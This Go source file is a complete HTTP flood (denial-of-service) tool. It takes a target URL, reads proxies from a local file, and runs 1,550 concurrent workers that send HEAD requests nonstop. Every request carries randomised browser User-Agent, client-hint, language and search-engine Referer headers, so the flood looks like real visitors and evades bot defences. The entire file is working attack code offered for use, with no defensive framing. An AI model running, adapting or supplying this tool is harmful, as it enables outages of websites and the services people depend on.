package main

import (
"bufio"
"context"
"crypto/tls"
"math/rand"
"net"
"net/http"
"net/url"
"os"
"os/signal"
"runtime"
"strconv"
"strings"
"sync"
"syscall"
"time"
)

const (
workers = 1550
requestTimeout = 3 * time.Second
)

var UA = []string{
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
"Mozilla/5.0 (Android 15; Mobile; rv:137.0) Gecko/137.0 Firefox/137.0",
"Mozilla/5.0 (Android 14; Mobile; rv:136.0) Gecko/136.0 Firefox/136.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 OPR/112.0.0.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 OPR/112.0.0.0",
}

var ASEP = []string{
"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

var ASEPJAWA = []string{
"en-US,en;q=0.9,id;q=0.8",
"en-US,en;q=0.9",
"en-GB,en;q=0.9",
"en-US,en;q=0.8,id;q=0.7",
"en-US,en;q=0.9,zh;q=0.8",
"en-US,en;q=0.9,ja;q=0.8",
}

var CARI = []string{
"https://www.google.com/search?q=",
"https://www.bing.com/search?q=",
"https://www.yahoo.com/search?p=",
"https://www.duckduckgo.com/?q=",
}

func init() {
runtime.GOMAXPROCS(runtime.NumCPU())
rand.Seed(time.Now().UnixNano())
}

func Browser(ua string) (browser string, version string, platform string, mobile bool) {
if strings.Contains(ua, "Edg") {
browser = "Edge"
} else if strings.Contains(ua, "OPR") || strings.Contains(ua, "Opera") {
browser = "Opera"
} else if strings.Contains(ua, "Firefox") {
browser = "Firefox"
} else if strings.Contains(ua, "Safari") && !strings.Contains(ua, "Chrome") {
browser = "Safari"
} else if strings.Contains(ua, "Chrome") {
browser = "Chrome"
} else {
browser = "Other"
}

if strings.Contains(ua, "Windows NT") {
platform = "Windows"
} else if strings.Contains(ua, "Mac OS X") || strings.Contains(ua, "Macintosh") {
platform = "macOS"
} else if strings.Contains(ua, "Linux") && !strings.Contains(ua, "Android") {
platform = "Linux"
} else if strings.Contains(ua, "Android") {
platform = "Android"
} else if strings.Contains(ua, "iPhone") || strings.Contains(ua, "iPad") {
platform = "iOS"
} else {
platform = "Windows"
}

if strings.Contains(ua, "Mobile") || strings.Contains(ua, "Android") || strings.Contains(ua, "iPhone") || strings.Contains(ua, "iPad") {
mobile = true
} else {
mobile = false
}

switch browser {
case "Chrome":
if idx := strings.Index(ua, "Chrome/"); idx != -1 {
ver := ua[idx+7:]
if dot := strings.Index(ver, "."); dot != -1 {
version = ver[:dot]
}
}
if version == "" {
version = "146"
}
case "Edge":
if idx := strings.Index(ua, "Edg/"); idx != -1 {
ver := ua[idx+4:]
if dot := strings.Index(ver, "."); dot != -1 {
version = ver[:dot]
}
}
if version == "" {
version = "146"
}
case "Opera":
if idx := strings.Index(ua, "OPR/"); idx != -1 {
ver := ua[idx+4:]
if dot := strings.Index(ver, "."); dot != -1 {
version = ver[:dot]
}
}
if version == "" {
version = "112"
}
case "Firefox":
if idx := strings.Index(ua, "Firefox/"); idx != -1 {
ver := ua[idx+8:]
if dot := strings.Index(ver, "."); dot != -1 {
version = ver[:dot]
}
}
if version == "" {
version = "137"
}
case "Safari":
if idx := strings.Index(ua, "Version/"); idx != -1 {
ver := ua[idx+8:]
if dot := strings.Index(ver, "."); dot != -1 {
version = ver[:dot]
}
}
if version == "" {
version = "18"
}
default:
version = "99"
}
return
}

func main() {
if len(os.Args) < 2 {
os.Exit(1)
}
LINK := os.Args[1]
var durasi int = 0
if len(os.Args) >= 3 {
if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
durasi = d
}
}
PARSE, _ := url.Parse(LINK)
host := PARSE.Hostname()
var LinkProxy []*url.URL
file, err := os.Open("proxy.txt")
if err == nil {
defer file.Close()
scanner := bufio.NewScanner(file)
for scanner.Scan() {
line := strings.TrimSpace(scanner.Text())
if line == "" {
continue
}
if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
line = "http://" + line
}
if p, err := url.Parse(line); err == nil {
LinkProxy = append(LinkProxy, p)
}
}
}
if len(LinkProxy) == 0 {
LinkProxy = append(LinkProxy, nil)
}
clients := make([]*http.Client, len(LinkProxy))
for i, UrlProxy := range LinkProxy {
transport := &http.Transport{
DialContext: (&net.Dialer{
Timeout: 2 * time.Second,
KeepAlive: 30 * time.Second,
}).DialContext,
DisableKeepAlives: false,
MaxIdleConns: 20000,
MaxIdleConnsPerHost: 10000,
MaxConnsPerHost: 0,
IdleConnTimeout: 60 * time.Second,
TLSClientConfig: &tls.Config{
InsecureSkipVerify: true,
MinVersion: tls.VersionTLS11,
MaxVersion: tls.VersionTLS13,
NextProtos: []string{"h2", "http/1.1"},
},
ForceAttemptHTTP2: true,
DisableCompression: true,
TLSHandshakeTimeout: 3 * time.Second,
ResponseHeaderTimeout: 2 * time.Second,
ExpectContinueTimeout: 0,
}
if UrlProxy != nil {
transport.Proxy = http.ProxyURL(UrlProxy)
}
clients[i] = &http.Client{
Transport: transport,
Timeout: requestTimeout,
}
}

ctx, cancel := context.WithCancel(context.Background())
var wg sync.WaitGroup

if durasi > 0 {
time.AfterFunc(time.Duration(durasi)*time.Second, func() {
cancel()
})
}

for i := 0; i < workers; i++ {
wg.Add(1)
cl := clients[i%len(clients)]
go func(c *http.Client) {
defer wg.Done()
for ctx.Err() == nil {
req, _ := http.NewRequest("HEAD", LINK, nil)
ua := UA[rand.Intn(len(UA))]
accept := ASEP[rand.Intn(len(ASEP))]
lang := ASEPJAWA[rand.Intn(len(ASEPJAWA))]

req.Header.Set("User-Agent", ua)
req.Header.Set("Accept", accept)
req.Header.Set("Accept-Language", lang)
req.Header.Set("Accept-Encoding", "gzip, deflate, br, zstd")
req.Header.Set("Connection", "keep-alive")
req.Header.Set("Upgrade-Insecure-Requests", "1")
req.Header.Set("Sec-Fetch-Dest", "document")
req.Header.Set("Sec-Fetch-Mode", "navigate")
req.Header.Set("Sec-Fetch-Site", "cross-site")
req.Header.Set("Sec-Fetch-User", "?1")
req.Header.Set("Cache-Control", "max-age=0")

browser, version, platform, mobile := Browser(ua)

secChUa := ""
switch browser {
case "Chrome":
secChUa = "\"Chromium\";v=\"" + version + "\", \"Google Chrome\";v=\"" + version + "\", \"Not?A_Brand\";v=\"99\""
case "Edge":
secChUa = "\"Chromium\";v=\"" + version + "\", \"Microsoft Edge\";v=\"" + version + "\", \"Not?A_Brand\";v=\"99\""
case "Opera":
secChUa = "\"Chromium\";v=\"" + version + "\", \"Opera\";v=\"" + version + "\", \"Not?A_Brand\";v=\"99\""
case "Firefox":
secChUa = "\"Firefox\";v=\"" + version + "\", \"Not?A_Brand\";v=\"99\""
case "Safari":
secChUa = "\"Safari\";v=\"" + version + "\", \"Not?A_Brand\";v=\"99\""
default:
secChUa = "\"Not?A_Brand\";v=\"99\""
}
req.Header.Set("Sec-Ch-Ua", secChUa)

if mobile {
req.Header.Set("Sec-Ch-Ua-Mobile", "?1")
} else {
req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
}
req.Header.Set("Sec-Ch-Ua-Platform", "\""+platform+"\"")

if rand.Intn(8) != 0 {
se := CARI[rand.Intn(len(CARI))]
req.Header.Set("Referer", se+host)
}

resp, err := c.Do(req)
if err == nil {
resp.Body.Close()
}
}
}(cl)
}

sigChan := make(chan os.Signal, 1)
signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
select {
case <-sigChan:
cancel()
case <-ctx.Done():
}
wg.Wait()
}
